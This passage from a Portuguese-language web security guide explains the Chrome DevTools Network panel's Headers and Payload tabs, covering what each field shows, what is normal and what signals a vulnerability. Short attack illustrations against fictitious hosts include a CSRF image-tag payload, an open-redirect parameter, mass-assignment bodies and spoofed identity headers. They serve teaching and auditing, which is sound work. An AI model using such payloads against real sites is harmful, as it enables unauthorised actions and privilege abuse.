- **Para que serve**: entender *o que* foi pedido, *como* foi pedido e *o que* o servidor respondeu em termos de política (cache, segurança, CORS — *Cross-Origin Resource Sharing*, compartilhamento de recursos entre origens —, cookies, tipo de conteúdo).
- **Onde encontrar**: Network → clique na requisição → aba **Headers** (geralmente a primeira aba). Cada seção pode ser recolhida/expandida clicando no seu título.
- **Exemplo prático**: ao abrir a requisição do documento principal de `https://loja-ficticia.test/`, você verifica, em *Response Headers*, se existem `Strict-Transport-Security`, `Content-Security-Policy` e `X-Content-Type-Options`.
- **Comportamento normal**: os headers aparecem por padrão em ordem alfabética e com nomes normalizados; em HTTP/2 e HTTP/3 os nomes chegam em minúsculas (exigência dos protocolos). Na seção *Response Headers*, versões recentes permitem passar o mouse sobre um valor e clicar no ícone de edição para **sobrescrever localmente** o header (recurso *Local Overrides*), útil para testar uma política antes de implantá-la no servidor. **[Varia por versão]**
- **O que é considerado seguro**: respostas com headers de segurança coerentes com o tipo de conteúdo (veja [Headers de Segurança](./05-headers-de-seguranca.md#s5)), ausência de headers que revelam versões de software, cookies com atributos de proteção, `Cache-Control` restritivo em respostas autenticadas.
- **O que pode indicar vulnerabilidade**: ausência de HSTS (*HTTP Strict Transport Security*) em site HTTPS, `Access-Control-Allow-Origin` refletindo qualquer origem junto com credenciais, `Server: Apache/2.4.29 (Ubuntu)` (versão exposta), `X-Powered-By: PHP/7.2.1`, `Set-Cookie` de sessão sem `HttpOnly`/`Secure`.
- **Como investigar**: use a busca global do Network (**Ctrl+F** / **Cmd+F**, que pesquisa em headers, payloads e respostas) por nomes como `authorization`, `set-cookie`, `server`; use o filtro `has-response-header:` na caixa de filtro para encontrar quais respostas contêm (ou, invertendo com **Invert**, não contêm) determinado header.
- **Como corrigir/prevenir**: configurar headers no servidor web/proxy reverso ou no framework de forma centralizada **[BOA PRÁTICA]**; remover banners de versão **[RECOMENDAÇÃO]**; aplicar HSTS em todo site servido exclusivamente via HTTPS **[RECOMENDAÇÃO]**.

##### Seção General

- **O que significa**: é o bloco-resumo no topo da aba Headers. Ele **não é um header HTTP real**; é uma composição feita pelo DevTools com dados da requisição e da conexão: **Request URL**, **Request Method**, **Status Code**, **Remote Address** e **Referrer Policy**.
- **Para que serve**: dar, em um relance, a resposta para "o que foi pedido, para onde, de que forma e com qual resultado".
- **Onde encontrar**: aba **Headers** → seção **General** (primeira seção).
- **Exemplo prático** (como apareceria no DevTools):

```text
General
  Request URL:      https://api.exemplo.test/v1/pedidos?pagina=2
  Request Method:   GET
  Status Code:      200 OK
  Remote Address:   203.0.113.25:443
  Referrer Policy:  strict-origin-when-cross-origin
```

- **Comportamento normal**: todos os campos preenchidos; o *Status Code* vem acompanhado de um ícone colorido (verde para 2xx, amarelo/laranja para 3xx, vermelho para 4xx/5xx — a cor exata pode variar) e da mensagem legível (ex.: "OK", "Not Modified").
- **O que é considerado seguro**: URL com esquema `https://`, método coerente com a operação (leitura com GET, alteração com POST/PUT/PATCH/DELETE), política de referência restritiva.
- **O que pode indicar vulnerabilidade**: `Request URL` com `http://` em página HTTPS (conteúdo misto), parâmetros sensíveis na URL, `Referrer Policy: unsafe-url`, `Remote Address` com IP de rede privada inesperado.
- **Como investigar**: analise cada campo individualmente (subtópicos a seguir) e compare com o comportamento esperado da aplicação.
- **Como corrigir/prevenir**: ver orientações de cada campo.

##### Request URL

- **O que significa**: a **URL completa** solicitada: esquema (`https`), host (`api.exemplo.test`), porta (implícita ou explícita), caminho (`/v1/pedidos`) e *query string* (`?pagina=2`). O fragmento (`#secao`) **nunca** é enviado ao servidor e, por isso, não aparece na requisição.
- **Para que serve**: confirmar exatamente qual recurso foi requisitado, inclusive após redirecionamentos (cada redirecionamento gera uma linha própria na tabela).
- **Onde encontrar**: Headers → General → **Request URL**. Também na coluna **URL** (opcional) da tabela, ou via clique direito → **Copy** → **Copy URL**.
- **Exemplo prático**: `https://loja-ficticia.test/busca?q=notebook&ordem=preco` mostra que o termo de busca vai na query string — normal. Já `https://loja-ficticia.test/login?usuario=ana&senha=123456` é um problema grave.
- **Comportamento normal**: URLs HTTPS, parâmetros de navegação/filtro na query string, identificadores opacos (UUIDs) quando há recurso específico.
- **O que é considerado seguro**: nenhuma credencial, token de sessão, token de redefinição de senha de longa duração ou dado pessoal sensível (CPF, número de cartão) na URL. **[REQUISITO]** Credenciais (senhas) nunca devem ser transmitidas na URL.
- **O que pode indicar vulnerabilidade**: `?token=eyJhbGciOi...`, `?api_key=...`, `?senha=...`, `?cpf=...`; IDs sequenciais (`/pedidos/1001`) que podem facilitar IDOR (*Insecure Direct Object Reference* — referência direta insegura a objeto) se o servidor não verificar autorização.
- **Como investigar**: filtre a tabela com termos como `token`, `key`, `senha`, `password`; ative a coluna **URL**; verifique se essas URLs também aparecem no header `Referer` de requisições para terceiros.
- **Como corrigir/prevenir**: enviar dados sensíveis no corpo de requisições POST ou em headers (ex.: `Authorization`) **[REQUISITO]** para senhas; usar `Referrer-Policy` restritiva **[RECOMENDAÇÃO]**; não depender da "imprevisibilidade" de IDs como controle de acesso — sempre validar autorização no servidor **[REQUISITO]**.

> [!WARNING]
> URLs ficam registradas em **logs de servidores e proxies**, no **histórico do navegador**, em ferramentas de monitoramento e podem vazar via header `Referer`. Por isso, "está em HTTPS" **não** torna aceitável colocar segredos na URL: o TLS protege o trânsito, mas não os registros nas pontas.

##### Request Method

- **O que significa**: o **método HTTP** usado (RFC 9110 — *HTTP Semantics*): `GET`, `POST`, `PUT`, `PATCH`, `DELETE`, `HEAD`, `OPTIONS` etc.
- **Para que serve**: indicar a intenção da requisição. `GET` e `HEAD` são **seguros** (não deveriam alterar estado) e `GET`, `HEAD`, `PUT`, `DELETE` e `OPTIONS` são **idempotentes** (repetir produz o mesmo efeito).
- **Onde encontrar**: Headers → General → **Request Method**; coluna opcional **Method**; filtro `method:POST` na caixa de filtro.
- **Exemplo prático**: um preflight CORS aparece como `OPTIONS` imediatamente antes da requisição real (ex.: `PUT https://api.exemplo.test/v1/perfil`). Uma exclusão de item no carrinho deveria aparecer como `DELETE /carrinho/itens/42` ou `POST`, nunca como `GET /carrinho/remover?id=42`.
- **Comportamento normal**: leituras com GET; envios de formulário de login com POST; APIs REST (*Representational State Transfer*) usando PUT/PATCH/DELETE.
- **O que é considerado seguro**: operações que alteram estado usam métodos não seguros (POST/PUT/PATCH/DELETE) e são protegidas contra CSRF (*Cross-Site Request Forgery* — falsificação de requisição entre sites) por tokens anti-CSRF e/ou cookies `SameSite`.
- **O que pode indicar vulnerabilidade**: login via `GET` (senha na URL); ações de alteração via `GET` (vulneráveis a CSRF trivial, por exemplo com `<img src="https://loja-ficticia.test/conta/excluir?confirmar=1">`); servidor aceitando métodos não previstos (ex.: `TRACE` habilitado).
- **Como investigar**: filtre por `method:GET` e procure endpoints com verbos de ação no caminho (`/delete`, `/remover`, `/transferir`); em laboratório autorizado, reenvie a requisição com outro método via **Copy as cURL** e observe se o servidor aceita.
- **Como corrigir/prevenir**: respeitar a semântica dos métodos **[REQUISITO]** para operações que alteram estado; rejeitar métodos não suportados com `405 Method Not Allowed` **[BOA PRÁTICA]**; desabilitar `TRACE` **[RECOMENDAÇÃO]**.

##### Status Code

- **O que significa**: o **código de status** da resposta (RFC 9110), seguido da frase de motivo exibida pelo DevTools. Classes: `1xx` informativo, `2xx` sucesso, `3xx` redirecionamento, `4xx` erro do cliente, `5xx` erro do servidor. O DevTools acrescenta, entre parênteses, a **origem** da resposta quando ela não veio da rede:
  - **`(from memory cache)`** — servida do cache em memória do processo de renderização (recursos já usados na mesma sessão/aba; some ao fechar a aba);
  - **`(from disk cache)`** — servida do cache HTTP em disco, sem contato com o servidor;
  - **`(from service worker)`** — a resposta foi entregue por um *service worker* (que pode, por sua vez, ter buscado na rede ou no Cache Storage);
  - **`(from prefetch cache)`** — o recurso havia sido pré-buscado (ex.: `<link rel="prefetch">`) **[Varia por versão]**.
- **Para que serve**: saber se a operação teve sucesso, se houve redirecionamento, se o cache foi usado e se houve erro — e de quem é a culpa (cliente ou servidor).
- **Onde encontrar**: Headers → General → **Status Code**; coluna **Status** da tabela (que também pode exibir valores especiais como `(failed)`, `(blocked:origin)`, `CORS error`, `(canceled)`, `(pending)`); filtro `status-code:404`.
- **Exemplo prático**:

```text
Status Code: 200 OK (from disk cache)
Status Code: 304 Not Modified
Status Code: 302 Found
Status Code: 401 Unauthorized
Status Code: 403 Forbidden
Status Code: 500 Internal Server Error
```

- **Comportamento normal**: `200` para sucesso, `201 Created` após criação, `204 No Content` sem corpo, `301/302/307/308` para redirecionamentos, `304 Not Modified` quando a validação condicional confirma que a cópia em cache ainda é válida, `401` quando falta autenticação, `403` quando falta permissão, `404` para recurso inexistente.
- **O que é considerado seguro**: códigos coerentes e páginas de erro genéricas; `401/403` consistentes para recursos protegidos; redirecionamento de `http://` para `https://` com `301` ou `308` seguido de HSTS.
- **O que pode indicar vulnerabilidade**:
  - `200 OK` ao acessar recurso de outro usuário (possível IDOR/BOLA — *Broken Object Level Authorization*);
  - `500` com corpo contendo **stack trace** (vazamento de informação);
  - diferença de status ou de tempo entre "usuário inexistente" e "senha incorreta" (enumeração de usuários);
  - resposta autenticada com `(from disk cache)` após logout (dados sensíveis armazenados em cache);
  - `302` para URL externa controlada por parâmetro (`?next=https://site-malicioso.test`) — *open redirect*.
- **Como investigar**: filtre `status-code:500` e leia a aba Response; ative **Preserve log** para acompanhar cadeias de redirecionamento entre páginas; após logout, use o botão Voltar e verifique se páginas privadas reaparecem servidas do cache.
- **Como corrigir/prevenir**: tratamento centralizado de erros com mensagens genéricas para o usuário e detalhes apenas em logs internos **[REQUISITO]** em produção; mensagens de login uniformes **[RECOMENDAÇÃO]**; `Cache-Control: no-store` em respostas com dados sensíveis **[RECOMENDAÇÃO]**; lista de destinos permitidos (*allowlist*) para redirecionamentos **[REQUISITO]** quando o destino vem de entrada do usuário.

> [!TIP]
> Um `304 Not Modified` **houve contato com o servidor** (requisição condicional com `If-None-Match`/`If-Modified-Since`), apenas sem corpo. Já `(from disk cache)` e `(from memory cache)` **não** contataram o servidor. Essa diferença costuma cair em prova.

##### Remote Address

- **O que significa**: o **endereço IP e a porta** do servidor (ou do proxy) com quem o navegador efetivamente se conectou. IPv6 aparece entre colchetes, ex.: `[2001:db8::10]:443`.
- **Para que serve**: confirmar para qual servidor a requisição foi realmente enviada (útil para validar resolução de DNS — *Domain Name System* —, CDN — *Content Delivery Network* —, ambiente de homologação vs. produção, arquivo `hosts` alterado ou proxy).
- **Onde encontrar**: Headers → General → **Remote Address**; coluna opcional **Remote address**; versões recentes têm ainda as colunas **Remote address space** e **Initiator address space** (que classificam o endereço como público, privado ou local) **[Varia por versão]**.
- **Exemplo prático**: `Remote Address: 198.51.100.7:443` para `www.exemplo.test`; em desenvolvimento local, `127.0.0.1:3000` ou `[::1]:8080`.
- **Comportamento normal**: IP público do servidor/CDN e porta 443 (HTTPS) ou 80 (HTTP). Se um proxy estiver configurado no sistema, o endereço exibido tende a ser o do proxy. Respostas vindas do cache ou de service worker podem não exibir o campo ou exibir dados da conexão original.
- **O que é considerado seguro**: endereços coerentes com a infraestrutura esperada; porta padrão; nenhum acesso inesperado a redes privadas a partir de páginas públicas.
- **O que pode indicar vulnerabilidade**: domínio público resolvendo para IP privado (RFC 1918: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) — pode indicar DNS mal configurado, *DNS rebinding* ou página pública tentando acessar dispositivos da rede interna; IP diferente do esperado para um domínio sensível (possível envenenamento de DNS ou proxy interceptando, embora com HTTPS válido isso seja improvável sem um certificado confiável comprometido).
- **Como investigar**: compare com `nslookup`/`dig` do domínio; verifique se há proxy configurado; observe as colunas de espaço de endereço; consulte a aba **Issues** sobre bloqueios de acesso a rede privada (*Private Network Access*/*Local Network Access*), recurso cujos nomes e comportamento mudaram ao longo das versões **[Varia por versão]**.
- **Como corrigir/prevenir**: DNS correto e monitorado **[BOA PRÁTICA]**; DNSSEC (*DNS Security Extensions*) quando aplicável **[RECOMENDAÇÃO]**; serviços internos não expostos sem autenticação e validando o header `Host` (mitiga *DNS rebinding*) **[RECOMENDAÇÃO]**.

##### Referrer Policy

- **O que significa**: a **política de referência** efetiva aplicada à requisição — define quanto da URL de origem será enviada no header `Referer` (grafado historicamente com um "r" a menos). Valores possíveis (especificação *Referrer Policy* do W3C): `no-referrer`, `no-referrer-when-downgrade`, `origin`, `origin-when-cross-origin`, `same-origin`, `strict-origin`, `strict-origin-when-cross-origin` e `unsafe-url`.
- **Para que serve**: controlar o vazamento de caminhos e parâmetros de URL para outros sites.
- **Onde encontrar**: Headers → General → **Referrer Policy**. A política pode vir do header de resposta `Referrer-Policy`, de `<meta name="referrer">`, do atributo `referrerpolicy` em elementos ou do padrão do navegador.
- **Exemplo prático**: com `strict-origin-when-cross-origin` (padrão moderno do Chrome quando nada é definido), uma requisição da página `https://loja-ficticia.test/pedido/123?cupom=ABC` para `https://cdn.terceiro.test/lib.js` envia apenas `Referer: https://loja-ficticia.test/`.
- **Comportamento normal**: `strict-origin-when-cross-origin` — envia URL completa para a mesma origem, apenas a origem para outras origens via HTTPS e nada em *downgrade* (HTTPS → HTTP).
- **O que é considerado seguro**: `strict-origin-when-cross-origin`, `same-origin`, `strict-origin` ou `no-referrer`, conforme a necessidade.
- **O que pode indicar vulnerabilidade**: `unsafe-url` (envia a URL completa, com query string, até para HTTP); `no-referrer-when-downgrade` em páginas cujas URLs contêm dados sensíveis — ambos podem vazar tokens para terceiros (analytics, CDNs, anúncios).
- **Como investigar**: abra uma requisição para domínio de terceiro e examine o header `Referer` em *Request Headers*; procure tokens ou dados pessoais nele.
- **Como corrigir/prevenir**: definir `Referrer-Policy: strict-origin-when-cross-origin` (ou mais restritiva) no servidor **[RECOMENDAÇÃO]**; e, principalmente, não colocar segredos em URLs **[REQUISITO]** para credenciais.

##### Response Headers

- **Nome do parâmetro**: `Response Headers` (Cabeçalhos de Resposta).
- **O que significa**: conjunto de pares `Nome: Valor` enviados pelo servidor HTTP (ou proxy reverso / CDN — *Content Delivery Network*) de volta ao navegador juntamente com o código de status da resposta, conforme a RFC 9110 (*HTTP Semantics*). Inclui metadados de controle de conteúdo (`Content-Type`, `Content-Length`, `Content-Encoding`), políticas de armazenamento em cache (`Cache-Control`, `ETag`, `Expires`, `Vary`), definição de estado (`Set-Cookie`), controle de acesso entre origens (`Access-Control-Allow-*`) e cabeçalhos defensivos (`Strict-Transport-Security`, `Content-Security-Policy`, `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`, `Permissions-Policy`, `Cross-Origin-*`). Em conexões HTTP/2 (RFC 9113) e HTTP/3 (RFC 9114), pode exibir também o pseudo-header `:status` quando o modo **Raw** está ativado.
- **Para que serve**: instruir o navegador sobre como interpretar, renderizar, armazenar em cache e proteger a resposta recebida, além de fornecer ao analista visibilidade completa sobre as políticas de segurança e a pilha tecnológica do servidor.
- **Onde encontrar no DevTools**: painel **Network** → clique na requisição desejada → aba **Headers** → seção **Response Headers** (logo abaixo de *General*). Possui a caixa de seleção **Raw** (para ver os cabeçalhos exatamente como recebidos, sem formatação, quando disponível) e, em versões recentes do Chrome, o botão de filtro/edição para **Local Overrides** (sobrescrita local de cabeçalhos) ao passar o cursor sobre um cabeçalho **[Varia por versão]**.
- **Exemplo prático**:

```http
HTTP/1.1 200 OK
Date: Fri, 30 Oct 2026 10:15:00 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 184
Cache-Control: no-store, no-cache, must-revalidate
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src 'none'; frame-ancestors 'none'
Referrer-Policy: no-referrer
Set-Cookie: __Host-sid=9f8e7d6c5b4a3f2e1d0c; Path=/; Secure; HttpOnly; SameSite=Strict
```

- **Comportamento normal**: respostas HTML trazem `Content-Type: text/html; charset=utf-8` e cabeçalhos de proteção de documento (CSP — *Content Security Policy*, HSTS — *HTTP Strict Transport Security*, `X-Frame-Options`); respostas de API trazem `Content-Type: application/json` e políticas de cache explícitas; ativos estáticos versionados trazem `Cache-Control: public, max-age=31536000, immutable`.
- **O que seria considerado seguro**:
  - Presença consistente dos headers de segurança pertinentes ao contexto (veja [Headers de Segurança](./05-headers-de-seguranca.md#s5)) **[RECOMENDAÇÃO]**;
  - `Set-Cookie` de sessão com `Secure`, `HttpOnly` e `SameSite` (`Lax` ou `Strict`) **[REQUISITO]**;
  - `Cache-Control: no-store` em respostas contendo dados pessoais ou autenticados **[RECOMENDAÇÃO]**;
  - `Content-Type` explícito acompanhado de `X-Content-Type-Options: nosniff` **[REQUISITO]**;
  - Ausência de cabeçalhos que revelem versões exatas de infraestrutura (`Server`, `X-Powered-By`, `X-AspNet-Version`) **[BOA PRÁTICA]**.
- **O que poderia indicar uma vulnerabilidade**:
  - Ausência de `Strict-Transport-Security` em aplicação HTTPS ou de `Content-Security-Policy` / `X-Frame-Options` em páginas interativas (risco de *clickjacking* e maior impacto de XSS — *Cross-Site Scripting*);
  - `Access-Control-Allow-Origin: *` em endpoints privados ou reflexão arbitrária da origem combinada com `Access-Control-Allow-Credentials: true`;
  - `Set-Cookie` sem `HttpOnly` (exposto a `document.cookie` via XSS) ou sem `Secure` (pode trafegar em HTTP);
  - `Server: Apache/2.4.49` ou `X-Powered-By: Express` expondo versão vulnerável conhecida (*banner grabbing*);
  - `Cache-Control: public, max-age=3600` em um endpoint `/api/meu-extrato` (risco de *Web Cache Deception* ou vazamento em CDN/cache compartilhado).
- **Como investigar o problema**:
  1. Selecione a requisição principal do documento (`Doc`) e requisições de API (`Fetch/XHR`) e expanda **Response Headers**;
  2. Marque a opção **Raw** para conferir a ordem exata, a capitalização original (em HTTP/1.1) e eventuais cabeçalhos duplicados;
  3. Utilize a caixa de filtro da aba Network com `has-response-header:X-Powered-By` ou `-has-response-header:Content-Security-Policy` (usando o prefixo `-` para encontrar respostas que **não** possuem determinado cabeçalho);
  4. Adicione colunas personalizadas na tabela (*Response Headers* → *Manage Header Columns*) para comparar cabeçalhos entre dezenas de requisições simultaneamente.
- **Como corrigir ou prevenir**: centralizar a injeção de cabeçalhos de segurança no proxy reverso (Nginx, Apache, Envoy, Cloudflare) ou em *middlewares* globais do back-end (como o `helmet` no Node.js/Express) **[BOA PRÁTICA]**; desativar assinaturas de servidor (`server_tokens off;` no Nginx, `app.disable('x-powered-by')` no Express) **[RECOMENDAÇÃO]**; validar automaticamente a presença de headers obrigatórios no pipeline de CI/CD (*Continuous Integration / Continuous Delivery*) **[BOA PRÁTICA]**.

##### Request Headers

- **Nome do parâmetro**: `Request Headers` (Cabeçalhos de Requisição).
- **O que significa**: conjunto de cabeçalhos HTTP enviados pelo cliente (navegador) ao servidor para fornecer contexto sobre a requisição, negociar formatos (`Accept`, `Accept-Encoding`, `Accept-Language`), identificar o agente (`User-Agent`, `Sec-CH-UA*`), transportar credenciais (`Cookie`, `Authorization`), informar a origem (`Host`, `Origin`, `Referer`, `Sec-Fetch-*`) e controlar cache condicional (`If-None-Match`, `If-Modified-Since`). Em HTTP/2 e HTTP/3, inclui os pseudo-headers `:method`, `:path`, `:scheme` e `:authority`.
- **Para que serve**: permitir que o servidor autentique o cliente, aplique regras de CORS e CSRF, escolha a representação adequada do recurso e saiba como a requisição foi originada. Para o auditor no DevTools, revela exatamente o que o navegador está enviando — incluindo credenciais e cabeçalhos customizados de JavaScript.
- **Onde encontrar no DevTools**: painel **Network** → clique na requisição → aba **Headers** → seção **Request Headers** (abaixo de *Response Headers*). Contém a opção **Raw** (para ver a linha de requisição e os cabeçalhos brutos em HTTP/1.1, ou os pseudo-headers em HTTP/2 e HTTP/3).
- **Exemplo prático**:

```http
POST /v1/transferencias HTTP/1.1
Host: api.banco-ficticio.test
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9...
Origin: https://app.banco-ficticio.test
Referer: https://app.banco-ficticio.test/transferir
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
X-CSRF-Token: d8e9f0a1-b2c3-4d5e-6f7a-8b9c0d1e2f3a
Cookie: __Host-sess=4a8b9c1d2e3f4a5b6c7d
```

- **Comportamento normal**: o navegador anexa automaticamente cabeçalhos controlados (*forbidden request headers* segundo o Fetch Standard do WHATWG, como `Host`, `Origin`, `Referer`, `Cookie`, `Sec-Fetch-*`, que o JavaScript da página não pode falsificar diretamente) junto aos cabeçalhos definidos pela aplicação (`Authorization`, `Content-Type`, `X-CSRF-Token`).
  - **Aviso *"Provisional headers are shown"* (Cabeçalhos provisórios são exibidos)**: às vezes o DevTools mostra esse alerta amarelo no topo de *Request Headers*. Isso ocorre quando a requisição **não chegou a ser enviada pela rede** (foi bloqueada por uma extensão como bloqueador de anúncios, falhou no DNS/conexão, foi atendida diretamente pelo cache local sem ir à rede ou foi adiada) ou quando os cabeçalhos reais de camada de rede ainda não foram capturados do processo de rede do navegador **[Varia por versão]**. Nesses casos, cabeçalhos adicionados na etapa final da pilha de rede (como `Cookie` e detalhes de conexão) podem não aparecer na listagem provisória.
- **O que seria considerado seguro**:
  - Envio de `Authorization` ou `Cookie` exclusivamente sobre conexões `https://` **[REQUISITO]**;
  - Presença de cabeçalho anti-CSRF (`X-CSRF-Token` ou similar) em requisições que alteram estado baseadas em sessão por cookie **[REQUISITO]**;
  - `Referer` sem parâmetros sensíveis de query string (controlado por `Referrer-Policy`) **[RECOMENDAÇÃO]**;
  - Cabeçalhos de metadados de busca (`Sec-Fetch-Site`, `Sec-Fetch-Mode`, `Sec-Fetch-Dest`) presentes para auxiliar o servidor em políticas de *Fetch Metadata* **[BOA PRÁTICA]**.
- **O que poderia indicar uma vulnerabilidade**:
  - Credenciais em `Authorization: Basic ...` ou `Cookie` enviadas em requisições `http://` (texto claro na rede);
  - Vazamento de JWT (*JSON Web Token*) ou chave de API no cabeçalho `Referer` enviado para domínios de terceiros (analytics, fontes, imagens externas);
  - Envio de `Authorization: Bearer ...` ou cookies de sessão para subdomínios ou APIs de terceiros não confiáveis;
  - Aplicação front-end enviando cabeçalhos como `X-Admin: true`, `X-User-Id: 1` ou `X-Forwarded-For: 127.0.0.1` nos quais o back-end confia cegamente para controle de acesso.
- **Como investigar o problema**:
  1. Verifique se aparece o aviso *Provisional headers are shown*; se aparecer e você precisar ver os cabeçalhos reais enviados na rede, marque **Disable cache** na barra superior da aba Network, verifique se extensões não estão interceptando a requisição e recarregue a página;
  2. Ative a caixa **Raw** em *Request Headers* para inspecionar o formato exato;
  3. Use `Ctrl+F` no painel Network buscando por `Authorization`, `Bearer` ou `Cookie` para listar todas as requisições que enviam credenciais e conferir o domínio de cada uma (coluna **Domain**).
- **Como corrigir ou prevenir**: restringir o envio de tokens no cliente apenas à origem da API oficial da aplicação **[REQUISITO]**; configurar `SameSite` e escopo `Domain`/`Path` restritos nos cookies **[REQUISITO]**; jamais confiar no lado do servidor em cabeçalhos de identidade ou IP (`X-User-Id`, `X-Forwarded-For`) enviados diretamente pelo cliente sem validação por um proxy reverso confiável **[REQUISITO]**.

> [!IMPORTANT]
> Quando o alerta **"Provisional headers are shown"** aparece em *Request Headers*, a ausência do cabeçalho `Cookie` na tela **não prova** necessariamente que o cookie deixou de existir; significa apenas que o DevTools está mostrando a intenção inicial do *renderer* antes de a pilha de rede anexar os cabeçalhos finais (ou porque a requisição foi bloqueada/atendida por cache). Para auditar os cookies efetivos, marque **Disable cache** e confira também a aba **Cookies** da requisição.

##### Aba Payload

- **Nome do parâmetro**: Aba `Payload` (Carga Útil da Requisição).
- **O que significa**: aba dedicada do painel de detalhes da requisição que reúne todos os **dados enviados pelo cliente ao servidor** na URL e no corpo da mensagem HTTP. Agrupa, conforme o caso, três seções possíveis: **Query String Parameters**, **Form Data** e **Request Payload**.
- **Para que serve**: separar de forma limpa os metadados (aba *Headers*) dos dados de negócio enviados na requisição (parâmetros de busca, campos de formulário, objetos JSON, XML, GraphQL ou dados binários), facilitando a leitura, a decodificação de URL (*URL-decoding*) e a inspeção de segurança.
- **Onde encontrar no DevTools**: painel **Network** → clique em uma requisição que possua parâmetros na URL ou corpo de envio → aba **Payload** (localizada imediatamente ao lado da aba **Headers**).
  - **[Varia por versão]** Em versões antigas do Chrome DevTools, essas seções ficavam no final da própria aba **Headers**. No DevTools moderno, foram movidas para a aba própria **Payload**, que **só é exibida** quando a requisição contém parâmetros de *query string* ou corpo (*body*).
- **Exemplo prático**: em uma requisição `POST https://api.loja-ficticia.test/v1/carrinho?origem=home` com corpo JSON `{"produtoId": 502, "quantidade": 2}`, a aba **Payload** exibirá duas seções simultaneamente: **Query String Parameters** (`origem: home`) e **Request Payload** (a árvore interativa do JSON enviado).
- **Comportamento normal**: a aba aparece automaticamente para qualquer `GET` com `?chave=valor` ou qualquer `POST`/`PUT`/`PATCH`/`DELETE` que envie corpo; oferece botões como **view source** (ver texto bruto enviado) e **view URL-encoded** / **view decoded** (alternar entre valores codificados com `%XX` e valores legíveis).
- **O que seria considerado seguro**: dados estruturados segundo o esquema esperado pela API, sem campos de controle interno expostos (como `role`, `isAdmin`, `precoUnitario` calculado no cliente) e com dados sensíveis trafegando exclusivamente no corpo de requisições HTTPS.
- **O que poderia indicar uma vulnerabilidade**:
  - Senhas, tokens ou dados pessoais em *Query String Parameters*;
  - Presença de campos sensíveis de negócio ou privilégio no corpo (ex.: `{"produtoId": 10, "preco": 0.01}` ou `{"nome": "João", "is_admin": true}`), indicando risco de **Mass Assignment** (atribuição em massa) ou manipulação de parâmetros (*Parameter Tampering*);
  - *Payloads* contendo comandos SQL, fragmentos HTML/JS ou caminhos de arquivos (`../../`) que o servidor aceita sem validação.
- **Como investigar o problema**: abra a aba **Payload** em todas as requisições de escrita (`method:POST`, `method:PUT`, `method:PATCH`) e nas buscas (`?`); clique em **view source** para ver exatamente como os bytes foram serializados; em ambiente de laboratório autorizado, use **Copy as fetch** ou **Edit and Resend** **[Varia por versão]** para testar se o servidor valida e rejeita campos extras ou valores adulterados.
- **Como corrigir ou prevenir**: validar estritamente o esquema de entrada no servidor (*allowlist* de campos permitidos com bibliotecas de validação de schema) **[REQUISITO]**; recalcular preços, descontos e permissões exclusivamente no back-end **[REQUISITO]**.

##### Query String Parameters

- **Nome do parâmetro**: `Query String Parameters` (Parâmetros da String de Consulta).
- **O que significa**: seção da aba **Payload** que extrai e formata em pares chave-valor tudo o que vem após o ponto de interrogação (`?`) na URL da requisição, separando múltiplos parâmetros pelo caractere `&` e decodificando sequências *percent-encoded* (RFC 3986), como `%20` (espaço) ou `%40` (`@`).
- **Para que serve**: visualizar com clareza filtros de pesquisa, paginação, ordenação e parâmetros de rastreamento enviados na URL sem precisar decodificar manualmente uma linha longa cheia de `%2F` e `%3D`.
- **Onde encontrar no DevTools**: painel **Network** → clique em uma requisição cuja URL contenha `?` → aba **Payload** → seção **Query String Parameters**. Possui os controles **view source** (mostra a string bruta `q=cabo%20usb&pagina=1`) e **view URL-encoded** / **view decoded** (alterna entre codificado e decodificado).
- **Exemplo prático**:
  - Para a URL `https://loja-ficticia.test/produtos?categoria=eletr%C3%B4nicos&ordem=menor_preco&pagina=2`, a seção exibe:

```text
Query String Parameters (3)   [view source] [view URL-encoded]
  categoria: eletrônicos
  ordem:     menor_preco
  pagina:    2
```

- **Comportamento normal**: conter apenas parâmetros não sensíveis que identificam ou filtram recursos públicos ou de navegação (página, limite, termo de pesquisa público, aba ativa, `utm_source`).
- **O que seria considerado seguro**: uso restrito a parâmetros de consulta e paginação não confidenciais; ausência total de segredos, senhas, chaves de API, tokens de sessão ou dados pessoais protegidos (PII — *Personally Identifiable Information*) **[REQUISITO]**.
- **O que poderia indicar uma vulnerabilidade**:
  - `senha`, `password`, `token`, `jwt`, `session_id`, `api_key`, `secret` na query string;
  - Dados pessoais como `cpf=123.456.789-00`, `cartao=4111...`, `email=...` expostos na URL;
  - Parâmetros de redirecionamento abertos (`redirect=https://...`, `next=...`, `url=...`) suscetíveis a **Open Redirect** ou **SSRF** (*Server-Side Request Forgery* — falsificação de requisição no lado do servidor);
  - Parâmetros refletidos diretamente no HTML da resposta sem escapamento (vetor clássico de **XSS Refletido**).
- **Como investigar o problema**:
  1. Filtre requisições no painel Network digitando `?` na barra de filtro ou termos como `token=`, `key=`, `cpf=`, `redirect=`;
  2. Inspecione a seção **Query String Parameters** e copie o valor de cada parâmetro para procurar na aba **Response** (`Ctrl+F`) se o valor é refletido sem sanitização no HTML;
  3. Verifique se terços (scripts de analytics, pixels) recebem essa mesma query string no cabeçalho `Referer`.
- **Como corrigir ou prevenir**: migrar o envio de credenciais e dados pessoais para o corpo de requisições `POST` ou cabeçalhos HTTP sobre HTTPS **[REQUISITO]**; validar e higienizar no servidor qualquer parâmetro de query string antes de usá-lo em consultas a banco de dados, chamadas de rede ou renderização HTML **[REQUISITO]**.

##### Form Data

- **Nome do parâmetro**: `Form Data` (Dados de Formulário).
- **O que significa**: seção da aba **Payload** exibida quando o corpo da requisição é enviado com o tipo de mídia `application/x-www-form-urlencoded` (formato padrão de formulários HTML `<form method="POST">`, no qual os campos vão no corpo no formato `campo1=valor1&campo2=valor2`) ou `multipart/form-data` (usado principalmente quando há upload de arquivos com `<input type="file">`).
- **Para que serve**: inspecionar individualmente cada campo submetido por um formulário HTML ou requisição equivalente, permitindo alternar entre a visualização decodificada e o texto bruto codificado.
